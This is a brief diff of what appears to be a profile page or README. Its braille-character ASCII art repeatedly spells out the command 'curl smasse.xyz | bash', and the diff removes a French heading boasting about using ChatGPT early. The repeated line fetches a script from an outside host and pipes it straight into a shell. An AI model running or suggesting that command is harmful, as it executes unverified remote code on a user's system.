@@ -143,7 +143,6 @@ z | bash cu⠈⠛⠛⠛⠛⠁rl smasse.xyz | b
         <img src="https://camo.githubusercontent.com/8832f6da5261255416e55f9b1f285410c7384919f2d47aa68e2525e593796d5f/68747470733a2f2f692e70696e696d672e636f6d2f373336782f31362f30632f66662f31363063666637393865333538356234616537333739396339316335633862382e6a7067" width="200" />
       </td>
       <td align="center">
-        <h2> *** J'ai déjà utilisé ChatGPT avant vous !!! *** </h2>
         <h5>
           <pre>
 curl smasse⢀⣤⣤⣤⣤⡀xyz | bash⠀curl s
